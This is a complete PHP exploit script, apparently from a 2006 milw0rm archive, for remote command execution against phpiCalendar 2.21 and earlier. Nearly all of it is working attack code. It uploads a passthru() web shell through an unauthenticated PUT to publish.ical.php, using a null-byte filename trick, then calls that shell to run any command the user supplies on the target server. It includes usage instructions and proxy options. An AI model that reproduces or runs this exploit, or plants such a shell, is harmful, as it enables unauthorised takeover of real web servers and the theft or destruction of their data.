#!/usr/bin/php -q -d short_open_tag=on
<?
echo "php iCalendar <=2.21 publish.ical.php remote cmmnds xctn\r\n";
echo "by rgod rgod<AT>autistici<DOT>org\r\n";
echo "site: http://retrogod.altervista.org\r\n";
echo "this works if \"phpicalendar_publishing\" is set to 1 in config.inc.php\r\n\r\n";

# short explaination: phpICal lets users upload/delete files in WebDAV style
# through PUT / DELETE method; calendars/ folder by default is not protected
# by any authentication measure. Uploaded files have .ics extension but with
# a trick you can break filename through a null char to have a php file
# (this works always beacuse magic_quotes_gpc does not work with
# HTTP_RAW_POST data)

if ($argc<3) {
echo "Usage: php ".$argv[0]." host path cmd OPTIONS\r\n";
echo "host:      target server (ip/hostname)\r\n";
echo "path:      path to phpICal\r\n";
echo "\r\n";
echo "cmd:       a shell command\r\n";
echo "Options:\r\n";
echo "   -p[port]:    specify a port other than 80\r\n";
echo "   -P[ip:port]: specify a proxy\r\n";
echo "Examples:\r\n";
echo "php ".$argv[0]." localhost /phpical/ ls -la\r\n";
die;
}

error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);

function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i<=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
   {$result.="  .";}
   else
   {$result.="  ".$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=" ".dechex(ord($string[$i]));}
   else
   {$exa.=" 0".dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
  }
 return $exa."\r\n".$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
  #debug
  #echo "\r\n".$html;
}

$host=$argv[1];
$path=$argv[2];
$cmd="";$port=80;$proxy="";

for ($i=3; $i<=$argc-1; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if (($temp<>"-p") and ($temp<>"-P"))
{$cmd.=" ".$argv[$i];}
if ($temp=="-p")
{
  $port=str_replace("-p","",$argv[$i]);
}
if ($temp=="-P")
{
  $proxy=str_replace("-P","",$argv[$i]);
}
}
$cmd=urlencode($cmd);
if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}

$data="X-WR-CALNAME:suntzu.php".CHR(0x00)."F@kech4rs\n"; //one shot, kill fopen() & trim() php funcs
$data.='
<?php
if (get_magic_quotes_gpc())
{$_GET[cmd]=stripslashes($_GET[cmd]);}
ini_set("max_execution_time",0);
echo "Hi Master!";
echo 666;
passthru($_GET[cmd]);
echo 666;
?>
';
$packet ="PUT ".$p."calendars/publish.ical.php HTTP/1.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Connection: Close\r\n\r\n";
$packet.=$data;
#debug, shows packets in a nice format
#echo quick_dump($packet);
sendpacketii($packet);

sleep(1);

$packet="GET ".$p."calendars/suntzu.php?cmd=".$cmd." HTTP/1.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
#debug
#echo quick_dump($packet);
sendpacketii($packet);
if (strstr($html,"666")) {
echo "Exploit succeeded...\r\n";
$temp=explode("666",$html);
echo $temp[1];}
else {echo "Exploit failed...";}
?>

# milw0rm.com [2006-03-15]

